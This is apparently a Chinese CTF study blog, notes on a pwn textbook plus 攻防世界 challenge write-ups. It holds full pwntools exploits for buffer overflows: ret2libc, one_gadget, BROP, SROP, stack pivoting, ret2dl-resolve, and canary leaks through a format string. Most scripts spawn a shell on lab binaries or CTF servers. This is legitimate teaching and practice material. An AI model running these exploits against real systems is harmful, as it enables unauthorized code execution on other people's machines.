p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)io.send(payload)io.interactive() 这里的payload要在中间+ p64(ret_addr)， 这是为了对齐，具体看下面的参考文章 EXP2: 利用one_gadget，execve 函数 其实就是retlibc的感觉 12345678910111213141516171819from pwn import *context.log_level = &quot;debug&quot;libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io = process(&quot;rop64&quot;)system_addr = int(io.recvuntil(b&quot;\\n&quot;)[:-1], 16)log.info(&quot;system_addr: %s&quot; % hex(system_addr))libc_base = system_addr - libc.symbols[&#x27;system&#x27;]log.info(&quot;libc_base: %s&quot; % hex(libc_base))one_gadget = libc_base + 0x4f302payload = b&#x27;A&#x27; * 136 + p64(one_gadget)payload = payload.ljust(250, b&#x27;\\x00&#x27;)io.send(payload)io.interactive() 参考文章： http://picpo.top/2021/07/19/ubuntu18%E4%BB%A5%E4%B8%8A%E7%B3%BB%E7%BB%9F64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%8C%E6%89%80%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%A0%86/ http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html https://www.cnblogs.com/tcctw/p/11333743.html Blind ROPBROP，即Blind Return Oriented Programming, BROP能够在无法获得二进制程序的情况下，基于远程服务崩溃与否（连接是否中断），进行ROP攻击获得shell，可用于开启了ASLR、NX和canaries的64位Linux BROP原理传统的ROP攻击需要攻击者通过逆向等手段、从二进制文件中提取可用的gadgets，而BROP在符合一定的前提条件下，无需获得二进制文件。其中两个必要的条件是↓ 目标程序存在栈溢出漏洞，并且可以稳定触发 目标进程在崩溃后回立即重启，并且重启后的进程内存不会重新随机化，这样即使目标机器开启了ASLR也没有影响 BROP攻击的主要阶段如下 Stack reading ，泄露canaries和返回地址，然后从返回地址可以推算出程序的加载地址，用于后续gadgets的扫描。泄露方法是每次溢出一个字节，看程序是否崩溃。 Blind ROP, 这一阶段用于远程搜索gadgets，搜索gadgets的思路也是基于溢出返回地址后判断程序是否崩溃。要搜到stop gadgets，即让程序挂起的一些指令，例如进入无限循环，sleep或read啥的，因为要利用这个stop gadgets来搜索对我们有用的gadgets，即下面这样↓ 12payload = b&#x27;A&#x27; * buf_size + p64(gadgets) + ... +p64(stop gadgets) # 不会崩溃payload = b&#x27;A&#x27; * buf_size + p64(gadgets) # 会崩溃 一般可以搜通用的gadgets,像下面这种 1234567.text:000000000040078A 5B pop rbx.text:000000000040078B 5D pop rbp.text:000000000040078C 41 5C pop r12.text:000000000040078E 41 5D pop r13.text:0000000000400790 41 5E pop r14.text:0000000000400792 41 5F pop r15.text:0000000000400794 C3 retn Build the exploit, 利用得到的gadgets构造ROP，将程序从远程服务器的内存里传回来，BROP就转换成了普通的ROP攻击 HCTF 2016: bropexp为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221from pwn import *from binascii import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)# context.log_level = &quot;debug&quot;def get_buffer_size(): for i in range(1, 100): payload = &#x27;A&#x27; * i buffsize = len(payload) - 1 try: io = remote(&quot;127.0.0.1&quot;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) io.recvline() io.close() log.info(&quot;bad buffsize: %d&quot; % buffsize) except EOFError as e: io.close() log.info(&quot;buffsize: %d&quot; % buffsize) return buffsizedef get_stop_addr(buf_size): addr = 0x400000 while True: sleep(0.1) addr += 1 payload = b&#x27;A&#x27; * buf_size payload += p64(addr) try: io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) io.recvline() io.close() log.info(&quot;stop address: 0x%x&quot; % addr) return addr except EOFError as e: io.close() log.info(&quot;bad 0x%x&quot; % addr) except: log.info(&quot;Can&#x27;t connect&quot;) addr -= 1def get_gadgets_addr(buf_size, stop_addr): addr = stop_addr sleep(0.1) while True: addr += 1 payload = b&#x27;A&#x27; * buf_size + p64(addr) + b&#x27;AAAAAAAA&#x27; * 6 try: io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload+ p64(stop_addr)) io.recv(timeout=1) io.close() log.info(&quot;find address: 0x%x&quot; % addr) try: # check gadget io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) io.recv(timeout=1) io.close() log.info(&quot;bad address : 0x%x&quot; % addr) except: io.close() log.info(&quot;gadget address: 0x%x&quot; % addr) return addr except EOFError as e: io.close() log.info(&quot;bad: 0x%x&quot; % addr) except: log.info(&quot;Can&#x27;t connect&quot;) addr -= 1def get_puts_call_addr(buf_size, stop_addr, gadgets_addr): addr = stop_addr while True: sleep(0.1) addr += 1 payload = b&#x27;A&#x27; * buf_size + p64(gadgets_addr + 9) + p64(0x400000) + p64(addr) + p64(stop_addr) try: io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) if io.recv().startswith(b&#x27;\\x7fELF&#x27;): log.info(&quot;puts call address:0x%x&quot; % addr) io.close() return addr log.info(&quot;bad: 0x%x&quot; % addr) io.close() except EOFError as e: io.close() log.info(&quot;bad: 0x%x&quot; % addr) except: log.info(&quot;Can&#x27;t connect&quot;) addr -= 1def dump_memory(buf_size, stop_addr, gadgets_addr, puts_call_addr, start_addr, end_addr): result = b&#x27;&#x27; while start_addr &lt; end_addr: sleep(0.1) payload = b&#x27;A&#x27; * buf_size payload+= p64(gadgets_addr+9) payload+= p64(start_addr) payload+= p64(puts_call_addr) payload += p64(stop_addr) try: io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) data = io.recv()[:-1] if data == b&#x27;&#x27;: data = b&quot;\\x00&quot; log.info(&quot;leaking: 0x%x ---&gt; %s&quot; % (start_addr, hexlify(data))) result += data start_addr += len(data) io.close() except EOFError: log.info(&quot;EOF&quot;) return result except: log.info(&quot;Can&#x27;t connect&quot;) return result def get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_call_addr, puts_got): payload = b&#x27;A&#x27; * buf_size payload+= p64(gadgets_addr+9) payload+= p64(puts_got) payload+= p64(puts_call_addr) payload += p64(stop_addr) io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) data = io.recvline()[:-1] data = u64(data.ljust(8, b&quot;\\x00&quot;)) log.info(&quot;puts address: 0x%x&quot; % data) return datadef pwn(gadgets_addr, system_addr, binsh_addr): payload = b&#x27;A&#x27; * 72 + p64(gadgets_addr+10) +p64(gadgets_addr+9) + p64(binsh_addr) + p64(system_addr) io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) io.interactive()def leak2(addr): buf_size = 72 gadgets_addr = 0x40078a puts_call_addr = 0x400547 payload = b&#x27;A&#x27; * buf_size payload+= p64(gadgets_addr+9) payload+= p64(addr) payload+= p64(puts_call_addr) io = remote(&#x27;127.0.0.1&#x27;, 10001) io.sendafter(&quot;ssword?\\n&quot;, payload) sleep(0.2) data = io.recv()[:-1] if data == b&#x27;&#x27;: data = b&quot;\\x00&quot; log.info(&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;.format(hex(addr), hexlify(data))) io.close() return datadef leak1(puts_addr): system_addr = puts_addr - 0x80970 + 0x4f420 binsh_addr = puts_addr - 0x80970 + 0x1b3d88 return system_addr, binsh_addrdef get_ret_addr(): # get func return addr to get the base address retaddr = b&quot;&quot; for i in range(8): j = 0 while j &lt;= 255: try: tmp_addr = bytes([j]) io = remote(&#x27;127.0.0.1&#x27;, 10001) payload = b&#x27;A&#x27; * 72 + retaddr + tmp_addr io.sendafter(&quot;ssword?\\n&quot;, payload) sleep(0.2) tmp_recv = io.recv(timeout=1) if b&#x27;No password&#x27; in tmp_recv: retaddr = retaddr + tmp_addr log.info(&quot;------------&gt;correct address: &#123;&#125;&quot;.format(hexlify(retaddr))) io.close() j = j + 1 break else: log.info(&quot;bad address: &#123;&#125;&quot;.format(hexlify(tmp_addr))) j = j + 1 io.close() continue except EOFError: io.close() j = j + 1 log.info(&quot;bad address: &#123;&#125;&quot;.format(hexlify(tmp_addr))) continue except: log.info(&quot;Cant&#x27;t connect&quot;) continue log.info(&quot;return address: &#123;&#125;&quot;.format(hexlify(retaddr[::-1]))) return retaddr# buffersize = get_buffer_size() # 72# stop_addr = get_stop_addr(72) # 0x400545# gadgets_addr = get_gadgets_addr(72, 0x400545) #0x40078a# puts_call_addr = get_puts_call_addr(72, 0x400545, 0x40078a) # 0x400547# result = dump_memory(72, 0x400545, 0x40078a, 0x400547, 0x400000, 0x403000)# with open(&quot;code1.bin&quot;, &#x27;wb&#x27;) as f:# f.write(result)# puts_got = 0x601018# puts_addr = get_puts_addr(72, 0x400545, 0x40078a, 0x400547,puts_got) # 0x7ffff7a62970# leak1# system_addr, binsh_addr = leak1(0x7ffff7a62970)# leak2# data = DynELF(leak2, 0x0400590)# system_addr = data.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)# log.info(&quot;ststem_addr : &#123;&#125;&quot;.format(hex(system_addr))) # 0x7ffff7a31420# binsh_addr = system_addr - 0x4f420 + 0x1b3d88# sleep(1)# pwn(0x40078a, 0x7ffff7a31420, binsh_addr)get_ret_addr() 参考文章：https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html SROPSROP与ROP类似，通过栈溢出，覆盖返回地址并执行gadgets控制执行流。不同的是，SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放在栈中。这个地方有点类似windows那个挂起线程，然后设置线程上下文，然后恢复线程的 设置线程上下文然后恢复线程。 SROP原理Linux系统调用Linux的系统调用中，64位和32位的系统调用表分别位于/usr/include/asm/unistd_64.h和/usr/include/asm/unistd_32.h中，另外还需要查看/usr/include/bits/syscall.h 比如write的系统调用号是1，就往RAX里存入1，执行syscall，其实就是执行的write函数，当然rdi, rsi, rdx 得存入参数才可以 1234567//syscall.h#ifdef __NR_writev# define SYS_writev __NR_writev#endif...// unistd_64.h #define __NR_write 1 int 0x80 即80中断， 是最老的系统函数调用方式 syscall/sysret 是amd64 制定的标准， 也是目前的x86 64位的标准，即amd64 sysenter/syssysexit 是inter制定的x86 64位标准， 目前已被放弃 vdso 是linux内核虚拟出的so, 实现了int 80 和 syscall，调用方式为 vsyscall signal机制当有中断或异常发送时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文，再跳转到之前注册好的signal handler中进程处理，待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。（这个地方好像windows的异常处理啊），具体步骤如下。 一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息； 一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn 系统调用； signal handler被调用，signal handler的行为取决于收到了什么signal signal handler执行完后，如果程序没有终止，则返回地址用于执行sigreturn 系统调用 sigreturn 利用 signal frame恢复所有的寄存器以回到之前的状态。 最后，程序执行继续。 SROP，即Sigreturn Oriented Programming，就可以利用上面的第5步来进行攻击，即将返回地址覆盖为sigreturn gadget的指针，如果只有syscall，将RAX改为0XF，效果是一样的，然后在栈上覆盖上fake frame即可 参考文章 https://energygreek.github.io/2020/11/09/system-calls-method/ pwntools srop模块123456context.arch = &#x27;i386&#x27;SigreturnFrame(kernel=&#x27;i386&#x27;) # 32位系统运行32位程序SigreturnFrame(kernel=&#x27;amd64&#x27;) # 64位系统运行32位程序context.arch = &#x27;amd64&#x27;SigreturnFrame(kernel=&#x27;amd64&#x27;) # 64位系统运行64位程序 Backdoor CTF2017: Fun Signals 什么保护都没有开启 12345678910111213141516171819202122232425262728293031323334353637383940414243444546objdump -d funsignals_player_bin -M intel funsignals_player_bin: file format elf64-x86-64Disassembly of section .shellcode:0000000010000000 &lt;__start&gt;: 10000000: 31 c0 xor eax,eax 10000002: 31 ff xor edi,edi 10000004: 31 d2 xor edx,edx 10000006: b6 04 mov dh,0x4 10000008: 48 89 e6 mov rsi,rsp 1000000b: 0f 05 syscall 1000000d: 31 ff xor edi,edi 1000000f: 6a 0f push 0xf 10000011: 58 pop rax 10000012: 0f 05 syscall 10000014: cc int3 0000000010000015 &lt;syscall&gt;: 10000015: 0f 05 syscall 10000017: 48 31 ff xor rdi,rdi 1000001a: 48 c7 c0 3c 00 00 00 mov rax,0x3c 10000021: 0f 05 syscall 0000000010000023 &lt;flag&gt;: 10000023: 66 61 data16 (bad) 10000025: 6b 65 5f 66 imul esp,DWORD PTR [rbp+0x5f],0x66 10000029: 6c ins BYTE PTR es:[rdi],dx 1000002a: 61 (bad) 1000002b: 67 5f addr32 pop rdi 1000002d: 68 65 72 65 5f push 0x5f657265 10000032: 61 (bad) 10000033: 73 5f jae 10000094 &lt;flag+0x71&gt; 10000035: 6f outs dx,DWORD PTR ds:[rsi] 10000036: 72 69 jb 100000a1 &lt;flag+0x7e&gt; 10000038: 67 69 6e 61 6c 5f 69 imul ebp,DWORD PTR [esi+0x61],0x73695f6c 1000003f: 73 10000040: 5f pop rdi 10000041: 61 (bad) 10000042: 74 5f je 100000a3 &lt;flag+0x80&gt; 10000044: 73 65 jae 100000ab &lt;flag+0x88&gt; 10000046: 72 76 jb 100000be &lt;flag+0x9b&gt; 10000048: 65 72 00 gs jb 1000004b &lt;flag+0x28&gt; 可以发现程序，先执行了read命令，rdx,0x400，rsi是rsp rdi是0 ，执行read读入数据，把数据写到栈上，然后在执行调用号为0xf的系统调用 12#define __NR_read 0#define __NR_rt_sigreturn 15 所以只需要构造sigreturn frame，然后读入就OK了, exp为↓ 12345678910111213141516from pwn import *elf = ELF(&quot;./funsignals_player_bin&quot;)io = process(&quot;./funsignals_player_bin&quot;)context.clear()context.arch = &quot;amd64&quot;frame = SigreturnFrame()frame.rax = constants.SYS_writeframe.rdi = constants.STDOUT_FILENOframe.rsi = elf.symbols[&#x27;flag&#x27;]frame.rdx = 50frame.rip = elf.symbols[&#x27;syscall&#x27;]io.send(bytes(frame))io.interactive() stack pivotingstack pivoting 是一种将程序真实的堆栈转移到伪造堆栈上的技术，可用于绕过不可执行栈保护或者处理栈空间过小的情况。下面通过1个例题(32位的，书上还有个64位的，但是基本一样，不写了。。)来说下这种技术，这是ROP Emporium上的那个题 pivot32IDA打开分析 是在pwnme这个函数中存在栈溢出，但是只溢出了16个字节，显然对于构造ROP链是不够的，所以我们要用到栈转移技术，怎么转移呢？其实就是用了leave ret指令，leave ret，其实就跟mov esp, ebp; pop ebp; pop rip的效果是一样的, 我们把old ebp的位置覆盖为leakaddr - 4.然后执行mov esp,ebp， 所以现在esp就是leakaddr - 4了，然后再执行pop ebp， leak addr - 4这个位置的数就给了ebp了，然后esp执行leak addr，再执行ret的时候，就从leak addr这里取地址了，这样就完成了栈转移 回到这个例题，我们第一次输入的数据存到新栈那里，这里就是真正的要构造的ROP了，目的是为了执行 call ret2win来获取flag（这个函数应该是作者定义的，放到了libpivot32.so中），第二次输入的数据就存在旧栈那里，目的就是转移栈。 exp为: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *io = process(&quot;pivot32&quot;)elf = ELF(&quot;pivot32&quot;)lib = ELF(&quot;libpivot32.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;pop_eax = 0x0804882Cxchg_eax_esp = 0x804882Emov_eax_eax = 0x8048830add_eax_ebx = 0x08048833leave_ret = 0x080485f5pop_ebx = 0x080484a9call_eax= 0x080485f0foothold_plt = elf.plt[&#x27;foothold_function&#x27;]foothold_got = elf.got[&#x27;foothold_function&#x27;]offset = lib.symbols[&#x27;ret2win&#x27;] - lib.symbols[&#x27;foothold_function&#x27;]io.recvuntil(b&#x27;pivot: &#x27;)leakaddress = io.recvuntil(b&#x27;\\n&#x27;)leakaddress = int(leakaddress.decode(), 16)log.info(&quot;leakaddress: 0x%x&quot; % leakaddress)def step1(): payload = p32(foothold_plt) payload += p32(pop_eax) payload += p32(foothold_got) payload += p32(mov_eax_eax) payload += p32(pop_ebx) payload += p32(offset) payload += p32(add_eax_ebx) payload += p32(call_eax) io.sendafter(b&#x27;&gt; &#x27;, payload)def step2(): payload = b&#x27;A&#x27; * 40 payload += p32(leakaddress - 4) # pop ebp payload += p32(leave_ret) io.sendafter(b&#x27;&gt; &#x27;, payload)if __name__ == &quot;__main__&quot;: step1() step2() io.recvall() GreHack CTF2017: beerfighter IDA打开分析，发现在这个地方存在溢出，程序中存在syscall，所以采用srop的技术，然后由于我们最终调用syscall，是把rax设置为SYS_execve，然后rdi是/bin/sh，所以我们还需要提前调用read，即syscall,rax为SYS_read，把 /bin/sh写入进去，写入到.data段，下面是EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;beerfighter&quot;)io = process(&quot;beerfighter&quot;)syscall_addr = 0x00400764context.arch = &quot;amd64&quot;data_address = elf.get_section_by_name(&quot;.data&quot;).header.sh_addr + 0x10 # /bin/shbase_address = data_address + 8 # new stackpop_rax = 0x040077asigret_bytes = p64(pop_rax) + p64(constants.SYS_rt_sigreturn)+p64(syscall_addr) # 0xfframe2 = SigreturnFrame()frame2.rax = constants.SYS_execveframe2.rdi = data_address frame2.rsi = 0 frame2.rdx = 0 frame2.rip = syscall_addrframe1 = SigreturnFrame()frame1.rax = constants.SYS_readframe1.rdi = constants.STDIN_FILENO frame1.rsi = data_address frame1.rdx = len(bytes(frame2)) + 32frame1.rsp = base_address # new stack # 可以采用这种方式进行stack pivotframe1.rip = syscall_addrdef step_1(): payload1 = b&#x27;A&#x27; * (1040 + 8) payload1 += sigret_bytes payload1 += bytes(frame1) io.sendlineafter(b&#x27; &gt; &#x27;, b&#x27;1&#x27;) io.sendlineafter(b&#x27; &gt; &#x27;, b&#x27;0&#x27;) io.sendlineafter(b&#x27; &gt; &#x27;, payload1) io.sendlineafter(b&#x27; &gt; &#x27;, b&#x27;3&#x27;)def step_2(): payload2 = b&#x27;/bin/sh\\x00&#x27; payload2 += sigret_bytes payload2 += bytes(frame2) io.sendline(payload2) io.interactive()if __name__ == &quot;__main__&quot;: step_1() step_2() ret2dl-resolve现代漏洞利用通常包含两个阶段 第一步先通过信息泄露获得程序的内存布局 第二部才进行实际的漏洞利用 然而从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是就有了ret2dl-resolve，巧妙的利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露，就可以直接标识关键函数的位置并调用。( 我感觉这个ret2dl-resolve有点类似于windows下的那个GetProcAddress函数，就是动态获取函数的地址。。 ret2dl-resolve原理动态装载器负责将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。 每个符号都是Elf_Sym结构体，这些符号又共同组成了.dynsym段, Elf32_Sym的结构体如下 123456789typedef struct&#123; Elf32_Word st_name; /4字节* Symbol name (string tbl index) */ 相对于.dynstr段的偏移 Elf32_Addr st_value; /4字节* Symbol value */ 导出函数的地址，不导出时为NULL Elf32_Word st_size; /4字节* Symbol size */ unsigned char st_info; /1字节* Symbol type and binding */ unsigned char st_other; /1字节* Symbol visibility */ Elf32_Section st_shndx; /2字节* Section index */&#125; Elf32_Sym; 对于st_info段 123#define ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)#define ELF32_ST_TYPE(val) ((val) &amp; 0xf)#define ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf)) 对于pwn来说，只考虑st_name, st_info即可 12345st_name = 被调用函数名字符串地址相对于.dynstr段的偏移st_info = (0x1 &lt;&lt; 4) + 0x2 // (STB_GLOBAL &lt;&lt; 4) + STT_FUNC// 如果要绑定函数 st_info = 0x12 例如:__libc_start_main// 如果要绑定一般的指针 st_info = 0x11 例如:stdin// 如果要绑定变量 st_info = 0x20 例如:__gmon_start__ 在IDA中看到的.dynsym和.dynstr如下 导入符号的解析需要重定位，每个重定位项都是Elf_Rel结构体的实例，这些项又共同组成了.rel.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel的结构如下 12345typedef struct&#123; Elf32_Addr r_offset; /4字节* Address */ Elf32_Word r_info; /4字节* Relocation type and symbol index */&#125; Elf32_Rel; 对于r_offset项，是GOT表对应项的地址，r_info的高位3个字节用于标识该符号在.dymsym段的位置，即无符号下标，低1个字节是type，如果是6则是变量，为7则为函数，在IDA中看到的.rel.plt和.rel.dyn如图 _dl_runtime_resolve()函数有2个参数，第一个参数是link_map对象的地址，第二个参数是导入函数的标识（Elf_Rel在.rel.plt段中的偏移），函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_index标识了解析哪一个导入函数。 符号解析过程如图所示,这里要注意下32位和64位程序结构体会有所区别，而且这个.dl_runtime_resolve的第二个参数，对于32位程序是Elf_Rel在.rel.plt的偏移，对于64位程序是对应Elf_Rel在.rel.plt的索引 2种攻击场景RELRO保护机制会影响延迟绑定，因此也会影响retdl_resolve: Partial RELRO: 包括.dynamic段在内的一些段会被标识为只读 Full RELRO: 在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.plt段被完全初始化为目标函数的地址，并标记为只读 下面来看2个简单的攻击场景 关闭RELRO，.dynamic可写，因为动态装载器是通过.dynamic段的DT_STRTAB条目来获取.dynstr段的地址，所以我们可以修改DT_STRTAB来使其指向一个伪造的.dynstr段，在那里伪造假的字符串，这样在执行printf的时候，可以执行execve 开启Partial RELRO保护，使.dynamic段不可写，我们知道_dl_runtime_resolve的第二个参数是对应Elf_Rel相对.rel.plt的偏移，当这个数字非常大的时候，会超出.rel.plt段，我们使其正好落在.bss段，在那里伪造一个Elf_Rel，使r_offset的值指向一个可写的内存地址（用于保存解析后的地址），构造r_info。使其指向一个位于它后面的Elf_Sym，然后Elf_Sym中的st_name指向它后面的函数名字符串 XDCTF 2015: pwn200 IDA打开分析，在这个位置存在栈溢出漏洞，思路是在这个地方利用stack pivot将栈转移到bss段，然后在.bss段伪造Elf_Rel，Elf_Sym和函数名 EXP为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;pwn200&quot;)io = process(&quot;pwn200&quot;)io.recvline(&quot;2015~!\\n&quot;)pppr_addr = 0x080485cdpop_ebp_addr = 0x08048453leave_ret_addr = 0x08048481write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]plt_0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addrrel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addrdynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addrdynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addrbss_addr = elf.get_section_by_name(&#x27;.bss&#x27;).header.sh_addr + 0x800def stack_pivot(): payload1 = b&#x27;A&#x27; * 112 # buf payload1 += p32(read_plt) # return address payload1 += p32(pppr_addr) payload1 += p32(0) + p32(bss_addr) + p32(200) payload1 += p32(pop_ebp_addr) + p32(bss_addr) # ebp payload1 += p32(leave_ret_addr) io.send(payload1) def pwn(): r_sym = (bss_addr + 40 - dynsym) // 0x10 r_type = 0x7 r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) fake_reloc = p32(write_got) + p32(r_info) st_name = bss_addr + 56 - dynstr #&#x27;system\\x00\\x00&#x27; addr st_bind = 0x1 st_type = 0x2 st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf) fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info) reloc_index = bss_addr + 28 - rel_plt # offset payload2 = b&#x27;AAAA&#x27; # ebp payload2 += p32(plt_0) payload2 += p32(reloc_index) # call system payload2 += b&#x27;AAAA&#x27; payload2 += p32(bss_addr + 80) # 参数/bin/sh的位置 payload2 += b&#x27;A&#x27; * 8 payload2 += fake_reloc payload2 += b&#x27;A&#x27; * 4 # 到此 payload2为 40 bytes payload2 += fake_sym # 到此 payload2为 56 bytes payload2 += b&quot;system\\x00\\x00&quot; payload2 = payload2.ljust(80, b&#x27;A&#x27;) payload2 += b&#x27;/bin/sh\\x00&#x27; payload2 = payload2.ljust(100, b&#x27;A&#x27;) io.sendline(payload2) # pause() io.interactive()if __name__ == &quot;__main__&quot;: stack_pivot() pwn() 注意！：bss_addr = elf.get_section_by_name(&#39;.bss&#39;).header.sh_addr + 0x800 这个地方卡了好久，要+0x800左右的数据才能跑通，加的少了估计会有其他函数也用到这个内存的数据，会冲突，导致跑不通","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"攻防世界PWN刷题1","slug":"pwn刷题1","date":"2022-04-01T13:41:00.000Z","updated":"2022-04-01T13:42:18.176Z","comments":true,"path":"2022/04/01/pwn刷题1/","link":"","permalink":"https://zzzzsky.github.io/2022/04/01/pwn%E5%88%B7%E9%A2%981/","excerpt":"","text":"攻防世界PWN刷题11. dice_gameXCTF 4th-QCTF-2018 IDA打开程序分析，发现是一个随机数的小游戏 在这个地方存在溢出，可以把seed给覆盖掉，把seed覆盖为0，然后自己写个程序看随机数 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; srand(0); for(int i =0; i &lt; 50; i ++) &#123; int tmp = rand() % 6 + 1; printf(&quot;%d, &quot;, tmp); &#125; return 0;&#125; 然后写EXP即可 12345678910111213141516171819from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;dice_game&quot;)io = remote(&quot;111.200.241.244&quot;, 53975)payload = b&#x27;A&#x27;* 55payload = payload.ljust(0x48, b&#x27;\\x00&#x27;)number = [2, 5, 4, 2, 6, 2, 5, 1, 4, 2, 3, 2, 3, 2, 6, 5, 1, 1, 5, 5, 6, 3, 4, 4, 3, 3, 3, 2, 2, 2, 6, 1, 1, 1, 6, 4, 2, 5, 2, 5, 4, 4, 4, 6, 3, 2, 3, 3, 6, 1]io.sendafter(&quot;name: &quot;, payload)for i in range(50): io.sendlineafter(&quot;6): &quot;, str(number[i]).encode())io.recvuntil(&quot;\\n&quot;)flag = io.recv()log.info(&quot;flag: %s&quot; % flag) 2. forgotbackdoorctf-2015 IDA打开分析，程序存在后门，地址是0x80486CC的位置，只需要让程序最终执行这个函数就OK了 exp为： 12345678910111213141516171819202122232425from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;d033ab68b3e64913a1b6b1029ef3dc29&quot;)io = remote(&#x27;111.200.241.244&#x27;, 56237)io.sendlineafter(&quot;&gt; &quot;, b&#x27;123&#x27;)payload = b&#x27;A&#x27;*32payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += b&#x27;A&#x27; * (32 - 4)payload += p32(1)io.sendlineafter(&quot;&gt; &quot;, payload)io.recv() 3. Mary_MortonASIS-CTF-Finals-2017 IDA打开程序分析，发现即存在栈溢出漏洞，也存在格式化字符串漏洞，所以用格式化字符串漏洞泄露canary，然后再利用缓冲区溢出调用后门获取flag 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;./22e2d7579d2d4359a5a1735edddef631&quot;)io = remote(&#x27;111.200.241.244&#x27;, 62874)io.sendlineafter(b&quot;battle \\n&quot;, b&#x27;2&#x27;)io.send(b&quot;%23$p&quot;)canary = int(io.recvuntil(&quot;battle \\n&quot;)[:18], 16)log.info(&quot;leak_canary: 0x%x&quot; % canary)backdoor = 0x04008DAio.sendline(b&#x27;1&#x27;)ret_addr = 0x4008EApayload = b&#x27;A&#x27; * 136 + p64(canary) + b&#x27;A&#x27;*8 + p64(ret_addr) + p64(backdoor) # 加ret是为了对齐io.send(payload)io.recvuntil(&#x27;\\n&#x27;)flag = io.recv()log.info(&quot;flag: &#123;&#125;&quot;. format(flag)) 4. stack2XCTF 4th-QCTF-2018 IDA打开程序分析，这个地方存在泄露，可以将返回地址覆盖掉 